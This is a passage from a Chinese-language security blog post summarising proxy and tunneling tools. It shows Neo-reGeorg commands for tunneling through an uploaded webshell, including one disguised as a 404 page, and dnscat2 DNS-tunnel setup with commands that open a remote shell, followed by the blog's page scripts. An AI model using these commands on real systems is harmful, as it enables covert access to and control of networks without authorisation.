+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python3 neoreg.py -k password -u http:&#x2F;&#x2F;xx&#x2F;tunnel.php</span><br><span class="line">+------------------------------------------------------------------------+</span><br><span class="line">  Log Level set to [ERROR]</span><br><span class="line">  Starting socks server [127.0.0.1:1080], tunnel at [http:&#x2F;&#x2F;k&#x2F;tunnel.php]</span><br><span class="line">+------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<h4 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h4><ul>
+<li>支持生成的服务端，在GET请求时响应页面内容 伪装成404等页面  自己构造404页面内容。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务端：</span><br><span class="line">$ python neoreg.py generate -k &lt;you_password&gt; --file 404.html</span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line">$ pytohn neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --skip</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果服务端（即是你传的文件）需要设置代理才能访问。可以使用参数<code>--proxy</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pytohn neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --proxy socks5:&#x2F;&#x2F;10.1.1.1:8080</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如需Authorization认证和定制的Header或Cookie</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pytohn neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; -H &#39;Authorization: cm9vdDppcyB0d2VsdmU&#x3D;&#39; --cookie &quot;key&#x3D;value;key2&#x3D;value2&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="DNScat"><a href="#DNScat" class="headerlink" title="DNScat"></a>DNScat</h3><p>不想自己编译可直接下载。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;downloads.skullsecurity.org&#x2F;dnscat2&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Linux编译-1"><a href="#Linux编译-1" class="headerlink" title="Linux编译"></a>Linux编译</h4><p>其DNS通信基于dnscat，因此其服务端需要dnscat。如果实在不能安装，参考官网。。。</p>
+<p>这里仅仅是Debian10_x64 Linux。我客户端make时候报错，但是不影响。。。可以./dnscat测试一下是否正常。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">apt-get install gem</span><br><span class="line">apt-get install ruby-dev</span><br><span class="line">apt-get install libpq-dev</span><br><span class="line">apt-get install ruby-bundler</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line">https://downloads.skullsecurity.org/dnscat2/ </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/client/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>配置服务端，建议使用自己配置的DNS。配置A,NS 解析</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">ruby ./dnscat2.rb vps.example.com -e open -c example.com --no-cache</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务端直连模式</span></span><br><span class="line">ruby ./dnscat2.rb --dns server=127.0.0.1,port=533,<span class="built_in">type</span>=TXT --secret=example.com</span><br><span class="line"><span class="comment"># -c 定义了&#x27;pre-shared secret&#x27;,可以使用具有预共享密钥的身份验证机制来防止中间人攻击，如果未定义该参数，则会自动生成随机字符串，客户端需要</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -e 规定的安全级别  open 表示服务端允许客户端不进行加密</span></span><br><span class="line"><span class="comment"># --no-cache 禁止缓存，建议添加：powershell-dnscat2客户端与dnscat2服务器的Caching模式不兼容。</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h4><p>没有配置域名，因此试验直连。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端  Linux</span></span><br><span class="line">ruby dnscat2.rb -s 553 -c 123</span><br><span class="line"><span class="comment"># 客户端 Win </span></span><br><span class="line">PS C:\Users\windows10\Desktop&gt; .\dnscat2-v0.07-client-win32.exe --dns server=VPS s,port=553 --secret=123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">windows	<span class="comment"># 查看连接</span></span><br><span class="line">window -i 1  <span class="comment"># 指定进入第一个连接</span></span><br><span class="line">shell. <span class="comment"># 开启SHELL连接，会新建一个连接，需要window -i 2</span></span><br><span class="line"></span><br><span class="line">卡卡卡卡卡卡卡卡卡卡卡卡卡</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>oudeniu
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://butnomingzi.github.io/posts/8949441d/" title="常用Proxy小结">https://butnomingzi.github.io/posts/8949441d/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Proxy/" rel="tag"><i class="fa fa-tag"></i> Proxy</a>
+              <a href="/tags/%E6%80%BB%E7%BB%93/" rel="tag"><i class="fa fa-tag"></i> 总结</a>
+              <a href="/tags/%E4%BB%A3%E7%90%86/" rel="tag"><i class="fa fa-tag"></i> 代理</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/a1b49219/" rel="prev" title="Github语法">
+      <i class="fa fa-chevron-left"></i> Github语法
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/6e52a8fb/" rel="next" title="sqlmap关于MSSQL执行命令思考">
+      sqlmap关于MSSQL执行命令思考 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E5%B0%8F%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">代理小结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BloodHound"><span class="nav-number">1.1.1.</span> <span class="nav-text">BloodHound</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7"><span class="nav-number">1.2.</span> <span class="nav-text">代理工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NetCat"><span class="nav-number">1.2.1.</span> <span class="nav-text">NetCat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PowerCat"><span class="nav-number">1.2.2.</span> <span class="nav-text">PowerCat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH"><span class="nav-number">1.2.3.</span> <span class="nav-text">SSH</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dog-tunnel-lite"><span class="nav-number">1.2.4.</span> <span class="nav-text">dog-tunnel-lite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fpr"><span class="nav-number">1.2.5.</span> <span class="nav-text">Fpr</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reGeorg"><span class="nav-number">1.2.6.</span> <span class="nav-text">reGeorg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Neo-reGeorg"><span class="nav-number">1.2.7.</span> <span class="nav-text">Neo-reGeorg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNScat"><span class="nav-number">1.2.8.</span> <span class="nav-text">DNScat</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">oudeniu</p>
+  <div class="site-description" itemprop="description">一点都对，半点都没错。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcG90YXRzb1NlYy8=" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;potatsoSec&#x2F;">宽字节安全</span>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+      <div id="music163player">
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=280 height=420 src="//music.163.com/outchain/player?type=0&id=5008808022&auto=1&height=430"></iframe>
+      </div>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">oudeniu</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">202k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">3:04</span>
+</div>
+    <!-- 网站运行时间的设置 -->
+    <span id="timeDate">载入天数...</span>
+    <span id="times">载入时分秒...</span>  
+    <script>
+        var now = new Date();
+        function createtime() {
+            var grt= new Date("03/03/2020 13:14:21");//此处修改你的建站时间或者网站上线时间
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+            document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+            document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        }
+    setInterval("createtime()",250);
+    </script>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+  <script src="https://www.gstatic.com/firebasejs/6.3.3/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/6.3.3/firebase-firestore.js"></script>
+  <script>
+    firebase.initializeApp({
+      apiKey   : '',
+      projectId: ''
+    });
+
+    function getCount(doc, increaseCount) {
+      // IncreaseCount will be false when not in article page
+      return doc.get().then(d => {
+        var count = 0;
+        if (!d.exists) { // Has no data, initialize count
+          if (increaseCount) {
+            doc.set({
+              count: 1
+            });
+            count = 1;
+          }
+        } else { // Has data
+          count = d.data().count;
+          if (increaseCount) {
+            // If first view this article
+            doc.set({ // Increase count
+              count: count + 1
+            });
+            count++;
+          }
+        }
+
+        return count;
+      });
+    }
+
+    function appendCountTo(el) {
+      return count => {
+        el.innerText = count;
+      }
+    }
+  </script>
+  <script data-pjax>
+    (function() {
+      var db = firebase.firestore();
+      var articles = db.collection('articles');
+
+      if (CONFIG.page.isPost) { // Is article page
+        var title = document.querySelector('.post-title').innerText.trim();
+        var doc = articles.doc(title);
+        var increaseCount = CONFIG.hostname === location.hostname;
+        if (localStorage.getItem(title)) {
+          increaseCount = false;
+        } else {
+          // Mark as visited
+          localStorage.setItem(title, true);
+        }
+        getCount(doc, increaseCount).then(appendCountTo(document.querySelector('.firestore-visitors-count')));
+      } else if (CONFIG.page.isHome) { // Is index page
+        var promises = [...document.querySelectorAll('.post-title')].map(element => {
+          var title = element.innerText.trim();
+          var doc = articles.doc(title);
+          return getCount(doc);
+        });
+        Promise.all(promises).then(counts => {
+          var metas = document.querySelectorAll('.firestore-visitors-count');
+          counts.forEach((val, idx) => {
+            appendCountTo(metas[idx])(val);
+          });
+        });
+      }
+    })();
+  </script>
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"}});</script></body>
+</html>
